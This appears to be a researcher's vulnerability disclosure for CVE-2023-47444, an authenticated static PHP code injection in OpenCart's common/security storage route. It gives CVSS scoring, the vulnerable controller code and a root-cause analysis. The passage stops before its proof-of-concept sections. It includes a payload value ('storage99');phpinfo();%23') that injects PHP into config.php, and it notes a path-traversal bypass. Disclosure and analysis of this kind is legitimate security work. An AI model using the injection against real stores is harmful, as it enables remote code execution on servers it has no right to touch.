platforms to practice Ethical Hacking in 2022</a></li><li class="nav-list-item"><a href="/writeups/infosec-education/my-oscp-journey/" class="nav-list-link">My OSCP Journey</a></li></ul></li><li class="nav-list-item"><button class="nav-list-expander btn-reset" aria-label="toggle items in HackTheBox category" aria-pressed="false"> <svg viewBox="0 0 24 24" aria-hidden="true"><use xlink:href="#svg-arrow-right"></use></svg> </button><a href="/writeups/hackthebox/" class="nav-list-link">HackTheBox</a><ul class="nav-list"><li class="nav-list-item"><a href="/writeups/hackthebox/noter/" class="nav-list-link">Noter</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/timelapse/" class="nav-list-link">Timelapse</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/late/" class="nav-list-link">Late</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/routerspace/" class="nav-list-link">RouterSpace</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/paper/" class="nav-list-link">Paper</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/admirertoo/" class="nav-list-link">AdmirerToo</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/knife/" class="nav-list-link">Knife</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/love/" class="nav-list-link">Love</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/armageddon/" class="nav-list-link">Armageddon</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/thenotebook/" class="nav-list-link">TheNotebook</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/spectra/" class="nav-list-link">Spectra</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/ophiuchi/" class="nav-list-link">Ophiuchi</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/scriptkiddie/" class="nav-list-link">ScriptKiddie</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/tenet/" class="nav-list-link">Tenet</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/delivery/" class="nav-list-link">Delivery</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/ready/" class="nav-list-link">Ready</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/tabby/" class="nav-list-link">Tabby</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/blunder/" class="nav-list-link">Blunder</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/traceback/" class="nav-list-link">Traceback</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/openadmin/" class="nav-list-link">OpenAdmin</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/obscurity/" class="nav-list-link">Obscurity</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/traverxec/" class="nav-list-link">Traverxec</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/postman/" class="nav-list-link">Postman</a></li><li class="nav-list-item"><a href="/writeups/hackthebox/writeup/" class="nav-list-link">Writeup</a></li></ul></li></ul> <div class="nav-category">Disclosures</div> <ul class="nav-list"><li class="nav-list-item"><a href="/disclosures/policy/" class="nav-list-link">Disclosure Policy</a></li><li class="nav-list-item"><button class="nav-list-expander btn-reset" aria-label="toggle items in Disclosed vulnerabilities category" aria-pressed="false"> <svg viewBox="0 0 24 24" aria-hidden="true"><use xlink:href="#svg-arrow-right"></use></svg> </button><a href="/disclosures/disclosed-vulnerabilities/" class="nav-list-link">Disclosed vulnerabilities</a><ul class="nav-list"><li class="nav-list-item"><a href="/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/" class="nav-list-link">Authenticated Static Code Injections in OpenCart (CVE-2023-47444)</a></li><li class="nav-list-item"><a href="/disclosures/disclosed-vulnerabilities/digital-private-vault/" class="nav-list-link">Digital Private Vault (APK)</a></li></ul></li></ul> <div class="nav-category">Cheatsheets and notes</div> <ul class="nav-list"><li class="nav-list-item"><a href="/cheatsheets/My%20Notes/" class="nav-list-link">My notes 🡵</a></li><li class="nav-list-item"><a href="/cheatsheets/Tools%20cheatsheets/" class="nav-list-link">Tools cheatsheets 🡵</a></li><li class="nav-list-item"><a href="/cheatsheets/File%20Transfer/" class="nav-list-link">File transfer 🡵</a></li><li class="nav-list-item"><a href="/cheatsheets/Privilege%20Escalation/" class="nav-list-link">Privilege Escalation 🡵</a></li><li class="nav-list-item"><a href="/cheatsheets/Shell%20cheatsheet/" class="nav-list-link">Shell cheatsheet 🡵</a></li><li class="nav-list-item"><a href="/cheatsheets/Shell%20upgrade/" class="nav-list-link">Upgrade your shell 🡵</a></li><li class="nav-list-item"><a href="/cheatsheets/Web%20and%20Network%20Hacking%20cheatsheet/" class="nav-list-link">Web & Network hacking cheatsheets 🡵</a></li><li class="nav-list-item"><a href="/cheatsheets/Mobile%20hacking%20cheatsheets/" class="nav-list-link">Mobile hacking cheatsheets 🡵</a></li></ul> </nav> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search" role="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search within the site..." aria-label="Search within the site..." autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <nav aria-label="Auxiliary" class="aux-nav"> <ul class="aux-nav-list"> <li class="aux-nav-list-item"> <a href="/support-me/" class="site-button" > Support me! </a> </li> </ul> </nav> </div> <div class="main-content-wrap"> <nav aria-label="Breadcrumb" class="breadcrumb-nav"> <ol class="breadcrumb-nav-list"> <li class="breadcrumb-nav-list-item"><a href="/disclosures/disclosed-vulnerabilities/">Disclosed vulnerabilities</a></li> <li class="breadcrumb-nav-list-item"><span>Authenticated Static Code Injections in OpenCart (CVE-2023-47444)</span></li> </ol> </nav> <div id="main-content" class="main-content"> <main> <style> .time { text-align: center; margin-top: 30px; font-family: 'Open Sans', sans-serif; font-weight: 300; font-style: normal; } </style> <p class="time">Published: 14 Nov 2023 | Last update: 01 Dec 2023 | Reading time: ~12 min</p> <h1 align="center"> Authenticated Static Code Injections in OpenCart (CVE-2023-47444) </h1> <p class="time" style="font-size: 75%;"> #OpenCart #code-injection #php #CVE-2023-47444 </p> <p><img src="/assets/images/disclosures/opencart-rce-CVE-2023-47444/storage-rce.png" alt="thumbnail.png" /></p> <blockquote class="abstract"> <p>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having <code class="language-plaintext highlighter-rouge">common/security</code> “access” and “modify” privileges can write arbitrary untrusted data inside <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code>, resulting in remote code execution on the underlying server.</p> </blockquote><hr /> <h2 class="no_toc text-delta" id="table-of-contents"> <a href="#table-of-contents" class="anchor-heading" aria-labelledby="table-of-contents"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Table of contents </h2> <ol id="markdown-toc"> <li><a href="#summary" id="markdown-toc-summary">Summary</a> <ol> <li><a href="#cvss-31-score" id="markdown-toc-cvss-31-score">CVSS 3.1 Score</a></li> <li><a href="#group-privileges-and-considerations" id="markdown-toc-group-privileges-and-considerations">Group Privileges and considerations</a></li> </ol> </li> <li><a href="#vulnerabilities" id="markdown-toc-vulnerabilities">Vulnerabilities</a> <ol> <li><a href="#vulnerabilities-details-and-root-causes" id="markdown-toc-vulnerabilities-details-and-root-causes">Vulnerabilities Details and Root Causes</a> <ol> <li><a href="#static-code-injection-in-commonsecuritystorage" id="markdown-toc-static-code-injection-in-commonsecuritystorage">Static Code Injection in common/security.storage</a></li> <li><a href="#static-code-injection-in-commonsecurityadmin" id="markdown-toc-static-code-injection-in-commonsecurityadmin">Static Code Injection in common/security.admin</a></li> </ol> </li> <li><a href="#exploit-conditions-and-prerequisites" id="markdown-toc-exploit-conditions-and-prerequisites">Exploit Conditions and Prerequisites</a></li> <li><a href="#proof-of-concept" id="markdown-toc-proof-of-concept">Proof-of-Concept</a> <ol> <li><a href="#poc-for-commonsecuritystorage" id="markdown-toc-poc-for-commonsecuritystorage">PoC for common/security.storage</a></li> <li><a href="#poc-for-commonsecurityadmin" id="markdown-toc-poc-for-commonsecurityadmin">PoC for common/security.admin</a></li> </ol> </li> <li><a href="#mitigations-and-hotfix" id="markdown-toc-mitigations-and-hotfix">Mitigations and hotfix</a></li> <li><a href="#disclosure-timeline" id="markdown-toc-disclosure-timeline">Disclosure Timeline</a></li> </ol> </li> </ol><hr /> <h2 id="summary"> <a href="#summary" class="anchor-heading" aria-labelledby="summary"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Summary </h2> <dl> <dt>Product</dt> <dd><a href="https://github.com/opencart/opencart">OpenCart</a></dd> <dt>Vendor</dt> <dd><a href="https://www.opencart.com/index.php?route=common/home">OpenCart</a></dd> <dt>Severity</dt> <dd>High</dd> <dt>Affected Version(s)</dt> <dd>4.0.0.0 - 4.0.2.3</dd> <dt>Tested Version(s)</dt> <dd>4.0.2.2, 4.0.2.3</dd> <dt>CVE</dt> <dd><a href="https://www.cve.org/CVERecord?id=CVE-2023-47444">CVE-2023-47444</a></dd> <dt>CVE Description</dt> <dd>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security "access" and "modify" privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.</dd> <dt>CWE</dt> <dd><a href="https://cwe.mitre.org/data/definitions/96.html">CWE-96: Improper Neutralization of Directives in Statically Saved Code</a></dd> </dl> <h3 id="cvss-31-score"> <a href="#cvss-31-score" class="anchor-heading" aria-labelledby="cvss-31-score"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CVSS 3.1 Score </h3> <p><strong>Base Score:</strong> 8.8 (High)<br /> <strong>Vector String:</strong> <code class="language-plaintext highlighter-rouge">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p> <div class="table-wrapper"><table> <thead> <tr> <th><strong>Metric</strong></th> <th><strong>Value</strong></th> </tr> </thead> <tbody> <tr> <td><strong>Attack Vector (AV)</strong></td> <td>Network</td> </tr> <tr> <td><strong>Attack Complexity (AC)</strong></td> <td>Low</td> </tr> <tr> <td><strong>Privileges Required (PR)</strong></td> <td>Low</td> </tr> <tr> <td><strong>User Interaction (UI)</strong></td> <td>None</td> </tr> <tr> <td><strong>Scope (S)</strong></td> <td>Unchanged</td> </tr> <tr> <td><strong>Confidentiality (C)</strong></td> <td>High</td> </tr> <tr> <td><strong>Integrity (I)</strong></td> <td>High</td> </tr> <tr> <td><strong>Availability (A)</strong></td> <td>High</td> </tr> </tbody> </table></div> <h3 id="group-privileges-and-considerations"> <a href="#group-privileges-and-considerations" class="anchor-heading" aria-labelledby="group-privileges-and-considerations"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Group Privileges and considerations </h3> <p>OpenCart manages privileges following a “matrix” approach, where read (access) and write (modify) permissions can be granted on every specific route, for any “User Group”.</p> <p class="text-center"><img src="/assets/images/disclosures/opencart-rce-CVE-2023-47444/permissions.png" alt="permissions" /></p> <p><code class="language-plaintext highlighter-rouge">common/security</code> is the route that (optionally) moves the <code class="language-plaintext highlighter-rouge">storage</code> folder out of the application root once the installation is complete, renames the <code class="language-plaintext highlighter-rouge">/admin</code> path to something new, and removes the installation folder when the installation process is finish.</p> <p class="text-center"><img src="/assets/images/disclosures/opencart-rce-CVE-2023-47444/common-security.gif" alt="common-security" /></p> <p>By default, OpenCart has only one administrator group and user, having full read/write permissions. All the other new users must be created and configured from scratch, including their permissions, so it depends on the individual configuration whether <code class="language-plaintext highlighter-rouge">common/security</code> is included or not.</p> <p>In my personal experience, I tested different client’s OpenCart installations, and many times I found non-administrative users (such as sales account, brand operators, support accounts, etc.) having the <code class="language-plaintext highlighter-rouge">common/security</code> permissions enabled. Reasons can range from misconception of the “common” privilege group, to lazyness of sysadmins applying a black-list approach (enabling everything with the “All” option and then removing only some permissions) instead of selecting only the specific desired permissions.</p> <p>From a pure threat model perspective, so, the vulnerability has some important pre-requisites (see also <a href="https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/#exploit-conditions-and-prerequisites">Exploit Conditions and Prerequisites</a>) that makes exploitation not so common and significantly lower the risk. Considering the various installation I tested in the past, however, we cannot assume that other installations do not also share the same bad practice. It may be that companies create and use other profiles besides <code class="language-plaintext highlighter-rouge">admin</code> and that these profiles include <code class="language-plaintext highlighter-rouge">common/security</code>, just as it may be that the numbers are significantly lower and that my cases were exceptions.</p> <h1 id="vulnerabilities"> <a href="#vulnerabilities" class="anchor-heading" aria-labelledby="vulnerabilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Vulnerabilities </h1> <p>There are two distinct static code injection vulnerabilities in the function that moves the <code class="language-plaintext highlighter-rouge">storage</code> folder outside the application web root, and the function that renames the secret <code class="language-plaintext highlighter-rouge">admin</code> path after the installation. While the latter can be exploited only if the <code class="language-plaintext highlighter-rouge">admin</code> folder has not yet been renamed, the former can be exploited anytime, even if the <code class="language-plaintext highlighter-rouge">storage</code> folder has already been moved. Both vulnerabilities require that the user has the <code class="language-plaintext highlighter-rouge">common/security</code> “access” and “modify” privileges enabled. Exploiting them, an authenticated adversary can inject arbitrary static PHP code that will be executed by every page, resulting in arbitrary remote code execution. Those vulnerabilities were both introduced from OpenCart 4.0.0.0 onward.</p> <blockquote class="warning"> <p>Because of the nature of the vulnerabilities, it is very likely to create disruption and break the application completely if the configuration files and the actual directories created on disk do not match at the end of exploitation.</p> </blockquote> <h2 id="vulnerabilities-details-and-root-causes"> <a href="#vulnerabilities-details-and-root-causes" class="anchor-heading" aria-labelledby="vulnerabilities-details-and-root-causes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Vulnerabilities Details and Root Causes </h2> <h3 id="static-code-injection-in-commonsecuritystorage"> <a href="#static-code-injection-in-commonsecuritystorage" class="anchor-heading" aria-labelledby="static-code-injection-in-commonsecuritystorage"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Static Code Injection in common/security.storage </h3> <blockquote class="bug"> <p>The <code class="language-plaintext highlighter-rouge">storage()</code> function in <code class="language-plaintext highlighter-rouge">upload/admin/controller/common/security.php</code> is vulnerable to PHP static code injection because <code class="language-plaintext highlighter-rouge">$name</code> and <code class="language-plaintext highlighter-rouge">$path</code> user-controlled variables are concatenated and placed inside <code class="language-plaintext highlighter-rouge">$base_new</code>, which is then written inside the <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> files, without proper escape or validation.</p> </blockquote> <p>The relevant vulnerable code can be found below:</p> <p><em>4.0.2.3/upload/admin/controller/common/security.php</em></p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">storage</span><span class="p">():</span> <span class="kt">void</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"page"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$page</span> <span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"page"</span><span class="p">];</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$page</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span> <span class="c1">// [1]</span>
            <span class="s2">"[^a-zA-z0-9_]"</span><span class="p">,</span>
            <span class="s2">""</span><span class="p">,</span>
            <span class="nb">basename</span><span class="p">(</span>
                <span class="nb">html_entity_decode</span><span class="p">(</span>
                    <span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]),</span> 
                    <span class="no">ENT_QUOTES</span><span class="p">,</span>
                    <span class="s2">"UTF-8"</span>
                <span class="p">)</span>
            <span class="p">)</span>
        <span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"path"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span> <span class="c1">// [2]</span>
            <span class="s2">"[^a-zA-z0-9_\:\/]"</span><span class="p">,</span>
            <span class="s2">""</span><span class="p">,</span>
            <span class="nb">html_entity_decode</span><span class="p">(</span>
                <span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s2">"path"</span><span class="p">]),</span> 
                <span class="no">ENT_QUOTES</span><span class="p">,</span>
                <span class="s2">"UTF-8"</span>
            <span class="p">)</span>
        <span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$json</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">hasPermission</span><span class="p">(</span><span class="s2">"modify"</span><span class="p">,</span> <span class="s2">"common/security"</span><span class="p">))</span> <span class="p">{</span>
        <span class="c1">// ...</span>
        <span class="nv">$base_new</span> <span class="o">=</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s2">"/"</span><span class="p">;</span>
        <span class="c1">// ...</span>
        <span class="nv">$root</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"/"</span><span class="p">,</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">server</span><span class="p">[</span><span class="s2">"DOCUMENT_ROOT"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"/../"</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$root</span> <span class="o">||</span> <span class="nv">$root</span> <span class="o">==</span> <span class="nv">$base_new</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [3]</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_storage"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_storage_exists"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_APPLICATION</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_writable"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_permission"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$json</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// ...</span>
        <span class="c1">// Create the new storage folder</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">))</span> <span class="p">{</span>
            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span> <span class="c1">// [5]</span>
        <span class="p">}</span>
        <span class="c1">// ...</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$start</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$end</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// moving all the files and directories from the old storage folder to the newer one</span>
            <span class="c1">// ...</span>
            
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$end</span> <span class="o">&lt;</span> <span class="nv">$total</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"next"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">url</span><span class="o">-&gt;</span><span class="nb">link</span><span class="p">(</span>
                <span class="s2">"common/security.storage"</span><span class="p">,</span>
                <span class="s2">"&amp;user_token="</span> <span class="mf">.</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s2">"user_token"</span><span class="p">]</span> <span class="mf">.</span>
                    <span class="s2">"&amp;name="</span> <span class="mf">.</span>
                    <span class="nv">$name</span> <span class="mf">.</span>
                    <span class="s2">"&amp;path="</span> <span class="mf">.</span>
                    <span class="nv">$path</span> <span class="mf">.</span>
                    <span class="s2">"&amp;page="</span> <span class="mf">.</span>
                    <span class="p">(</span><span class="nv">$page</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span>
                <span class="kc">true</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// Start deleting old storage location files and directories.</span>
            <span class="c1">// ...</span>
            <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$base_old</span><span class="p">);</span>
            <span class="c1">// Modify the config files</span>
            <span class="nv">$files</span> <span class="o">=</span> <span class="p">[</span><span class="no">DIR_APPLICATION</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">,</span> <span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">,</span> <span class="p">];</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$output</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
                <span class="nv">$lines</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$lines</span> <span class="k">as</span> <span class="nv">$line_id</span> <span class="o">=&gt;</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span> <span class="s1">'define(\'DIR_STORAGE'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$output</span><span class="mf">.</span><span class="o">=</span> <span class="s1">'define(\'DIR_STORAGE\', \''</span> <span class="mf">.</span> <span class="nv">$base_new</span> <span class="mf">.</span> <span class="s1">'\');'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// [6]</span>
                        
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nv">$output</span><span class="mf">.</span><span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$output</span><span class="p">);</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// ...</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>At <code class="language-plaintext highlighter-rouge">[1]</code> and <code class="language-plaintext highlighter-rouge">[2]</code>, the new storage directory’s name and path are obtained from the incoming HTTP GET request and stored into <code class="language-plaintext highlighter-rouge">$name</code> and <code class="language-plaintext highlighter-rouge">$path</code> PHP variables. In both cases, a regex is applied in order to remove special untrusted characters, however, the regex is badly implemented and so does nothing. Furthermore, the <code class="language-plaintext highlighter-rouge">basename()</code> <sup id="fnref:basename" role="doc-noteref"><a href="#fn:basename" class="footnote" rel="footnote">1</a></sup> function is used on the supplied <code class="language-plaintext highlighter-rouge">name</code> parameter, preventing us from using the <code class="language-plaintext highlighter-rouge">/</code> character inside it.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$foo</span> <span class="o">=</span> <span class="s2">"storage99');phpinfo();%23"</span><span class="p">;</span>
<span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-z0-9_]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$foo</span><span class="p">),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>

<span class="k">print</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span> <span class="c1">// storage99');phpinfo();%23</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span>

<span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-z0-9_]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$foo</span><span class="p">),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>

<span class="k">print</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span> <span class="c1">// storage99phpinfo23</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span>
</code></pre></div></div> <p>At <code class="language-plaintext highlighter-rouge">[3]</code>, after having verified the authenticated user has the write privilege for <code class="language-plaintext highlighter-rouge">common/security</code>, some checks are performed on <code class="language-plaintext highlighter-rouge">$base_new</code> (which is the concatenation of <code class="language-plaintext highlighter-rouge">$name</code> and <code class="language-plaintext highlighter-rouge">$path</code>). Here the application checks that <code class="language-plaintext highlighter-rouge">$base_new</code> is located inside the OpenCart’s installation folder, but the check is not well performed and (if required) can be bypassed using a path traversal:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$root</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nb">realpath</span><span class="p">(</span><span class="s1">'$this-&gt;request-&gt;server["DOCUMENT_ROOT"]'</span> <span class="mf">.</span> <span class="s1">'/../'</span><span class="p">));</span>
